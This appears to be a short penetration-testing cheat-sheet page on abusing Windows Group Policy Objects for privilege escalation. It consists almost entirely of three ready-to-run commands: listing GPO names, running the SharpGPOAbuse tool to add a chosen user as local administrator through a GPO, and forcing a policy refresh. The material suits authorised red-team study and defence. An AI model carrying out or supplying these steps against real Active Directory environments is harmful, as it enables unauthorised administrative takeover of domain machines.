---
title: "GPOs"
date: 2024-8-3
tags: ["GPOs", "Windows", "privesc", "Group Policy Objects"]
---

### Abuse #1: Add local admin

#### 1. List GPOs Name

```console
Get-GPO -All | Select-Object DisplayName
```

#### 2. Add localAdmin

```console
.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME>
```

#### 3. Force reload

```console
gpupdate /force
```

<small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>
